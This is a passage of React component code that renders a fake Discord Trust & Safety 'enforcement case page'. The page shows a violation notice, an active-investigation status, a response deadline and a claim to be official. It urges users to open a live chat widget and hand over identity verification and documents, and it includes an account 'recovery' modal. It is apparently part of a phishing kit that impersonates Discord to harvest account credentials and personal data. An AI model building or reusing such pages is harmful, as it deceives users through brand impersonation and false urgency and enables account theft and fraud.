              <span className="text-[#949ba4] text-xs w-28 flex-shrink-0 pt-0.5">Case Number</span>
              <span className="text-[#f2f3f5] font-mono text-sm font-semibold">{cas.caseNumber}</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-[#949ba4] text-xs w-28 flex-shrink-0 pt-0.5">Violation</span>
              <span className="text-[#f2f3f5] text-sm">{cas.violation}</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-[#949ba4] text-xs w-28 flex-shrink-0 pt-0.5">Reason</span>
              <span className="text-[#b5bac1] text-sm leading-relaxed">{cas.reason}</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-[#949ba4] text-xs w-28 flex-shrink-0 pt-0.5">Status</span>
              <span className="bg-[#ed4245]/20 text-[#ed4245] border border-[#ed4245]/30 text-xs px-2 py-0.5 rounded-full font-medium">Active Investigation</span>
            </div>
            <div className="flex items-start gap-3">
              <span className="text-[#949ba4] text-xs w-28 flex-shrink-0 pt-0.5">Timestamp</span>
              <span className="text-[#b5bac1] text-sm">{createdAt.toLocaleString()}</span>
            </div>
          </div>
        </div>

        {/* Violation Section */}
        <div className="bg-[#2b2d31] border border-[#ed4245]/30 rounded-xl overflow-hidden mb-5">
          <div className="px-5 py-4 border-b border-[#3f4147] flex items-center gap-3">
            <AlertCircle className="w-5 h-5 text-[#ed4245]" />
            <h3 className="text-[#f2f3f5] font-semibold">Violation Notice</h3>
          </div>
          <div className="p-5">
            <div className="bg-[#ed4245]/10 border border-[#ed4245]/20 rounded-lg p-4 mb-4">
              <div className="flex items-start gap-3">
                <AlertTriangle className="w-5 h-5 text-[#ed4245] flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-[#ed4245] font-semibold text-sm mb-1">{cas.violation}</p>
                  <p className="text-[#b5bac1] text-sm leading-relaxed">{cas.reason}</p>
                </div>
              </div>
            </div>
            <div className="space-y-2 text-sm text-[#b5bac1]">
              <p className="flex items-start gap-2"><span className="text-[#ed4245] mt-0.5">•</span> Your account is currently under review by Discord's Trust &amp; Safety team.</p>
              <p className="flex items-start gap-2"><span className="text-[#ed4245] mt-0.5">•</span> Continued violations may result in permanent suspension or account deletion.</p>
              <p className="flex items-start gap-2"><span className="text-[#ed4245] mt-0.5">•</span> You are required to respond within the session window shown above.</p>
            </div>
          </div>
        </div>

        {/* Timeline */}
        <div className="bg-[#2b2d31] border border-[#3f4147] rounded-xl overflow-hidden mb-5">
          <div className="px-5 py-4 border-b border-[#3f4147] flex items-center gap-3">
            <Clock className="w-5 h-5 text-[#5865F2]" />
            <h3 className="text-[#f2f3f5] font-semibold">Case History</h3>
          </div>
          <div className="p-5">
            <div className="relative">
              <div className="absolute left-4 top-0 bottom-0 w-px bg-[#3f4147]" />
              {[
                { label: "Case Created", desc: "Report submitted to Trust & Safety", date: createdAt.toLocaleString(), color: "bg-[#5865F2]" },
                { label: "Under Investigation", desc: "Case assigned to enforcement team", date: createdAt.toLocaleString(), color: "bg-[#faa61a]" },
                { label: "Awaiting Response", desc: "User notification sent — session active", date: new Date().toLocaleString(), color: "bg-[#ed4245]" },
              ].map((event, i) => (
                <div key={i} className="flex items-start gap-4 mb-5 last:mb-0 relative pl-9">
                  <span className={`absolute left-2.5 top-1.5 w-3 h-3 rounded-full ${event.color} border-2 border-[#2b2d31] -translate-x-1/2`} />
                  <div>
                    <p className="text-[#f2f3f5] text-sm font-medium">{event.label}</p>
                    <p className="text-[#949ba4] text-xs mt-0.5">{event.desc}</p>
                    <p className="text-[#949ba4] text-xs mt-1 font-mono">{event.date}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* How to Appeal */}
        <div className="bg-[#2b2d31] border border-[#3f4147] rounded-xl overflow-hidden mb-5">
          <div className="px-5 py-4 border-b border-[#3f4147] flex items-center gap-3">
            <HelpCircle className="w-5 h-5 text-[#3ba55c]" />
            <h3 className="text-[#f2f3f5] font-semibold">How to Appeal / Resolution Process</h3>
          </div>
          <div className="p-5 space-y-4">
            {[
              { step: "01", title: "Connect to Live Support", desc: "Click the blue chat button in the bottom-right corner to open the live support widget. You will be connected directly to a Trust & Safety agent." },
              { step: "02", title: "Provide Your Information", desc: "Explain your situation clearly. You may be asked to provide identity verification, account history, or context around the reported content." },
              { step: "03", title: "Submit Any Evidence", desc: "Upload screenshots, receipts, or any supporting documents through the chat window. Our team will review all submitted materials." },
              { step: "04", title: "Await Decision", desc: "Estimated response time: within this session. Complex cases may require up to 24 hours. You will be notified via this page and Discord." },
            ].map((s) => (
              <div key={s.step} className="flex items-start gap-4">
                <span className="text-[#5865F2] font-mono font-bold text-xs bg-[#5865F2]/10 rounded-md px-2 py-1 flex-shrink-0 mt-0.5">{s.step}</span>
                <div>
                  <p className="text-[#f2f3f5] text-sm font-semibold">{s.title}</p>
                  <p className="text-[#949ba4] text-sm mt-0.5 leading-relaxed">{s.desc}</p>
                </div>
              </div>
            ))}

            <div className="bg-[#5865F2]/10 border border-[#5865F2]/20 rounded-lg p-4 mt-2">
              <div className="flex items-center gap-2 mb-2">
                <CheckCircle className="w-4 h-4 text-[#5865F2]" />
                <p className="text-[#5865F2] font-semibold text-sm">Support is Online</p>
              </div>
              <p className="text-[#b5bac1] text-sm">A Trust &amp; Safety agent is available right now. Use the <strong className="text-[#f2f3f5]">live chat widget</strong> in the bottom-right corner to start your appeal immediately.</p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center text-[#949ba4] text-xs space-y-1">
          <div className="flex items-center justify-center gap-2">
            <Shield className="w-4 h-4 text-[#5865F2]" />
            <span className="text-[#5865F2] font-semibold">Discord Trust &amp; Safety</span>
          </div>
          <p>This is an official enforcement case page. Case: {cas.caseNumber}</p>
          <p>© {new Date().getFullYear()} Discord Inc. All rights reserved.</p>
        </div>
      </div>

      <ChatWidget slug={slug} caseId={cas.id} />

      {showRecovery && cas.recoveryEnabled && (
        <RecoveryModal slug={slug} cas={cas} onClose={() => setShowRecovery(false)} />
      )}
    </div>
  );
}
